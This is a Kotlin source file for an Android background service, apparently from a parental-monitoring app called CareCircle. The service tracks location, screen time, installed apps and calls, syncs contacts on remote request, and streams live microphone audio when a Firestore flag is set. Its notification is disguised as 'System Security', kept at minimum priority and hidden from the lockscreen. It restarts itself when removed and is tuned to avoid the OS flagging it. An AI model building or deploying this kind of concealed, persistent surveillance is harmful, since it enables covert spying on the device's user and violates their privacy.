package com.example.background

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

/**
 * 🛡️ CareCircleForegroundService (Master Service — Option B Architecture + Native WebRTC)
 *
 * Replaces old WatchdogService + FlutterBackgroundService:
 *
 * ARCHITECTURE PRINCIPLES:
 *  1. ✅ SINGLE FOREGROUND SERVICE — only one notification, one WakeLock
 *  2. ✅ NO ACCESSIBILITY DEPENDENCY — survives accessibility revocation
 *  3. ✅ CONTROLLED SYNC INTERVALS — Realme doesn't flag as "abnormal"
 *  4. ✅ WORKMANAGER-FRIENDLY — can be revived by WorkManager if killed
 *  5. ✅ INDEPENDENT — does its own work, doesn't depend on other services
 *  6. ✅ NATIVE WebRTC AUDIO — replaces Flutter WebRTC (24/7 stable)
 *
 * RESPONSIBILITIES:
 *  - Location updates (adaptive priority — battery-friendly)
 *  - Periodic heartbeat (3 min)
 *  - Realtime child_control listener (Firestore Snapshot Listener — 0 polling reads)
 *  - General data sync (30 min) — location + battery + device info + usage (NO contacts)
 *  - Contacts sync handling (triggered ONLY when parent explicitly requests)
 *  - Installed apps sync (24 hours)
 *  - Native WebRTC audio streaming (real-time)
 *  - WebRTC state restoration on service restart
 *  - Single persistent notification (dynamic text)
 *
 * NOT RESPONSIBLE FOR:
 *  - Service revival (handled by WorkManager + RestartReceiver)
 *  - App blocking (handled by AccessibilityWatchdogService — optional)
 *  - Notification capture (handled by CareCircleNotificationListener — independent)
 */
class CareCircleForegroundService : Service() {

    companion object {
        private const val TAG = "CC_FOREGROUND"
        private const val CHANNEL_ID = "carecircle_foreground_channel"
        private const val NOTIFICATION_ID = 1001

        // 🔥 Sync intervals (Realme-friendly — not too aggressive)
        private const val LOOP_INTERVAL_MS = 10_000L              // Main loop: 10s
        private const val WAKELOCK_RENEW_INTERVAL_MS = 4 * 60_000L  // Renew WakeLock: 4 min
        private const val HEARTBEAT_INTERVAL_MS = 3 * 60_000L     // Heartbeat: 3 min
        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L    // Full sync: 30 min (Screen Time, Device Info, Location ONLY)
        private const val APPS_SYNC_INTERVAL_MS = 24 * 60 * 60_000L  // Installed apps: 24 hours (1 day)

        private const val WAKE_LOCK_TAG = "CareCircle::MasterWakeLock"
        private const val PREFS_NAME = "carecircle_prefs"

        /**
         * Start the master foreground service.
         */
        fun start(context: Context) {
            val intent = Intent(context, CareCircleForegroundService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                Log.d(TAG, "CareCircleForegroundService start requested")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${e.message}")
            }
        }

        /**
         * Check if master service is running (used by WorkManager + RestartReceiver)
         */
        fun isRunning(context: Context): Boolean {
            return try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                @Suppress("DEPRECATION")
                val services = am.getRunningServices(Int.MAX_VALUE)
                services.any {
                    it.service.className == "com.example.background.CareCircleForegroundService"
                }
            } catch (e: Exception) {
                false
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var wakeLock: PowerManager.WakeLock? = null
    private var lastHeartbeat = 0L
    private var lastFullSync = 0L
    private var lastAppsSync = 0L
    private var lastSyncRequestCheck = 0L
    private var lastWakeLockRenew = 0L

    private lateinit var dataCollector: NativeDataCollector

    // 🔥 NEW: Native WebRTC for audio streaming
    private var nativeWebRTC: NativeWebRTCAudioSender? = null
    private var webrtcRunning = false
    private var webrtcCallId: String? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ CareCircleForegroundService created")

        // 🔥 CRITICAL: startForeground() within 5 sec of startForegroundService()
        try {
            createNotificationChannel()
            val notification = buildNotification()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                    Log.d(TAG, "✅ startForeground called (specialUse|microphone)")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ startForeground with microphone failed, falling back: ${e.message}")
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                    )
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ startForeground FAILED: ${e.message}")
        }

        // Device Admin status log
        try {
            val isAdminEnabled = CareCircleDeviceAdminReceiver.isEnabled(this)
            Log.d(TAG, "🔒 Device Admin: ${if (isAdminEnabled) "ENABLED" else "DISABLED"}")
        } catch (e: Exception) {
            Log.e(TAG, "Device Admin check failed: ${e.message}")
        }

        // Initialize Firebase + data collector
        try {
            FirestoreClient.init(this)
            dataCollector = NativeDataCollector(this)
            Log.d(TAG, "✅ Data collector initialized")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Data collector init failed: ${e.message}")
        }

        // 🔥 Indefinite WakeLock (single, renewed every 4 min)
        try {
            acquireWakeLock()
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock failed: ${e.message}")
        }

        // 🔥 Start call detection automatically (AirDroid style)
        try {
            CallDetectorService.start(this)
            Log.d(TAG, "✅ CallDetectorService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CallDetectorService: ${e.message}")
        }

        // 🔥 WebRTC Audio Sender (single instance reused across sessions)
        try {
            nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
            Log.d(TAG, "✅ NativeWebRTCAudioSender initialized")
        } catch (e: Exception) {
            Log.e(TAG, "NativeWebRTCAudioSender init failed: ${e.message}")
        }

        // 🔥 Clean up any stale WebRTC state from previous session
        clearStaleWebRTCState()

        // Start main loop
        handler.post(mainLoop)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand")
        // START_STICKY: System will restart service if killed
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "⚠️ Task removed — scheduling restart")
        try {
            val restartIntent = Intent(applicationContext, CareCircleForegroundService::class.java)
            val pendingIntent = PendingIntent.getService(
                this,
                1,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            try {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 2000,  // 2 sec delay
                    pendingIntent
                )
            } catch (se: SecurityException) {
                Log.w(TAG, "setAndAllowWhileIdle failed: ${se.message}")
                alarmManager.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 2000,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Restart schedule failed: ${e.message}")
        }
        super.onTaskRemoved(rootIntent)
    }

    private var controlListenerRegistration: com.google.firebase.firestore.ListenerRegistration? = null

    override fun onDestroy() {
        Log.w(TAG, "❌ Service destroyed")
        handler.removeCallbacks(mainLoop)
        serviceScope.cancel()
        releaseWakeLock()

        try {
            controlListenerRegistration?.remove()
            controlListenerRegistration = null
            Log.d(TAG, "Stopped child_control snapshot listener")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove snapshot listener: ${e.message}")
        }

        // 🔥 Stop call detection
        try {
            CallDetectorService.stop(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop CallDetectorService: ${e.message}")
        }

        // 🔥 NEW: Stop WebRTC on service destroy
        try {
            nativeWebRTC?.stop()
            nativeWebRTC = null
            webrtcRunning = false
        } catch (e: Exception) {
            Log.e(TAG, "WebRTC cleanup failed: ${e.message}")
        }

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ============ Main Loop ============
    private val mainLoop = object : Runnable {
        override fun run() {
            try {
                val now = System.currentTimeMillis()

                // 🔥 Ensure Realtime Snapshot Listener is attached (0 polling reads!)
                ensureChildControlListener()

                // 🔥 WakeLock renewal (defensive — system may have released)
                if (now - lastWakeLockRenew >= WAKELOCK_RENEW_INTERVAL_MS) {
                    renewWakeLock()
                    lastWakeLockRenew = now
                }

                // 📊 DATA COLLECTION — all on IO dispatcher (no ANR)
                if (::dataCollector.isInitialized) {

                    // 1. Heartbeat (3 min)
                    if (now - lastHeartbeat >= HEARTBEAT_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.sendHeartbeat()
                            } catch (e: Exception) {
                                Log.e(TAG, "Heartbeat: ${e.message}")
                            }
                        }
                        lastHeartbeat = now
                    }

                    // 2. Full data sync (30 min — Screen Time, Device Info, Location ONLY)
                    if (now - lastFullSync >= FULL_SYNC_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.collectAndSyncAll()
                            } catch (e: Exception) {
                                Log.e(TAG, "FullSync: ${e.message}")
                            }
                        }
                        lastFullSync = now
                    }

                    // 3. Installed apps sync (6 hours)
                    if (now - lastAppsSync >= APPS_SYNC_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.syncInstalledApps()
                            } catch (e: Exception) {
                                Log.e(TAG, "AppsSync: ${e.message}")
                            }
                        }
                        lastAppsSync = now
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Main loop error: ${e.message}")
            }

            handler.postDelayed(this, LOOP_INTERVAL_MS)
        }
    }

    /**
     * 🔥 Realtime Snapshot Listener Attachment — 0 Polling Reads!
     */
    private fun ensureChildControlListener() {
        if (controlListenerRegistration != null) return

        val uid = FirestoreClient.getUserId() ?: run {
            val prefsUid = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getString("currentUserId", null)
            if (!prefsUid.isNullOrEmpty()) {
                FirestoreClient.setUserId(prefsUid)
                prefsUid
            } else null
        } ?: return

        controlListenerRegistration = FirestoreClient.listenToChildControl { data ->
            handleChildControlChange(data)
        }

        if (controlListenerRegistration != null) {
            Log.d(TAG, "✅ Realtime snapshot listener attached to child_control/$uid (0 polling reads!)")
        }
    }

    /**
     * 🔥 Realtime handler for child_control document updates from Firestore.
     * Separates general sync (Screen time, Device Info, Location) from Contacts sync.
     */
    private fun handleChildControlChange(data: Map<String, Any?>) {
        val syncRequested = data["sync_request"] as? Boolean ?: false
        val contactsSyncRequested = data["contacts_sync_request"] as? Boolean ?: false
        val syncMic = data["sync_mic"] as? Boolean ?: false
        val callId = data["call_id"] as? String

        // 1. General Sync: Screen Time, Device Info & Location ONLY
        if (syncRequested) {
            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info & Location ONLY")
            serviceScope.launch {
                try {
                    dataCollector.collectAndSyncAll()
                } catch (e: Exception) {
                    Log.e(TAG, "General sync failed: ${e.message}")
                } finally {
                    FirestoreClient.updateSyncComplete()
                }
            }
        }

        // 2. Contacts Sync ONLY (when parent explicitly requests contacts sync)
        if (contactsSyncRequested) {
            Log.d(TAG, "📡 Contacts sync requested by parent — syncing Contacts ONLY")
            serviceScope.launch {
                try {
                    ContactsSyncHelper(applicationContext).syncContacts()
                } catch (e: Exception) {
                    Log.e(TAG, "Contacts sync failed: ${e.message}")
                } finally {
                    FirestoreClient.clearContactsSyncRequest()
                }
            }
        }

        // 3. Audio listening control (WebRTC)
        handleMicSync(syncMic, callId)
    }

    /**
     * 🔥 Handle audio listening (sync_mic)
     */
    private fun handleMicSync(syncMic: Boolean, callId: String?) {
        if (syncMic && !callId.isNullOrEmpty()) {
            if (webrtcCallId != callId || !webrtcRunning) {
                Log.d(TAG, "🎤 Audio requested for call $callId (previous: $webrtcCallId)")

                if (webrtcRunning) {
                    Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
                    try {
                        nativeWebRTC?.stop()
                    } catch (e: Exception) {
                        Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
                    }
                }

                // 🔥 Update notification FIRST to ensure MICROPHONE foreground service type is active
                updateNotification(
                    "CareCircle Listening Active",
                    "Parent is listening to surroundings"
                )

                try {
                    if (nativeWebRTC == null) {
                        nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
                    }
                    nativeWebRTC?.start(callId)
                    webrtcRunning = true
                    webrtcCallId = callId

                    getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("webrtc_running", true)
                        .putString("webrtc_call_id", callId)
                        .apply()
                } catch (e: Exception) {
                    Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
                    webrtcRunning = false
                    webrtcCallId = null
                }
            }
        } else if (!syncMic && webrtcRunning) {
            Log.d(TAG, "🛑 Stopping audio listening")
            try {
                nativeWebRTC?.stop()
                webrtcRunning = false
                webrtcCallId = null

                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("webrtc_running", false)
                    .remove("webrtc_call_id")
                    .apply()

                updateNotification(
                    "CareCircle Protection Active",
                    "Monitoring is running"
                )
            } catch (e: Exception) {
                Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
            }
        }
    }

    /**
     * 🔥 Clear any stale WebRTC state on service restart.
     * Never auto-restore old sessions — parent will initiate a fresh session if needed.
     */
    private fun clearStaleWebRTCState() {
        try {
            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean("webrtc_running", false)
                .remove("webrtc_call_id")
                .apply()
            webrtcRunning = false
            webrtcCallId = null
            Log.d(TAG, "🧹 Cleared stale WebRTC state")
        } catch (e: Exception) {
            Log.e(TAG, "WebRTC state clear failed: ${e.message}")
        }
    }

    /**
     * 🔥 NEW: Update notification text dynamically
     */
    private fun updateNotification(title: String, content: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(R.drawable.ic_notification)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setShowWhen(false)
                .build()

            // 🔥 CRITICAL: Update foreground service type to include MICROPHONE when audio is active
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                val serviceType = if (title.contains("Listening")) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                }
                startForeground(NOTIFICATION_ID, notification, serviceType)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }

            Log.d(TAG, "✅ Notification + service type updated (audio=${title.contains("Listening")})")
        } catch (e: Exception) {
            Log.e(TAG, "Notification update failed: ${e.message}")
        }
    }

    // ============ Notification ============

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security")
            .setContentText("Device protection active")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)  // 🔥 Non-dismissable
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Protection",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps system protection service active"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    // ============ WakeLock Management ============

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKE_LOCK_TAG)
        wakeLock?.setReferenceCounted(false)
        wakeLock?.acquire()  // 🔥 Indefinite
        Log.d(TAG, "✅ WakeLock acquired (indefinite)")
    }

    private fun renewWakeLock() {
        try {
            wakeLock?.let { wl ->
                if (!wl.isHeld) {
                    wl.acquire()
                    Log.d(TAG, "🔄 WakeLock re-acquired")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock renew failed: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock release failed: ${e.message}")
        }
    }
}
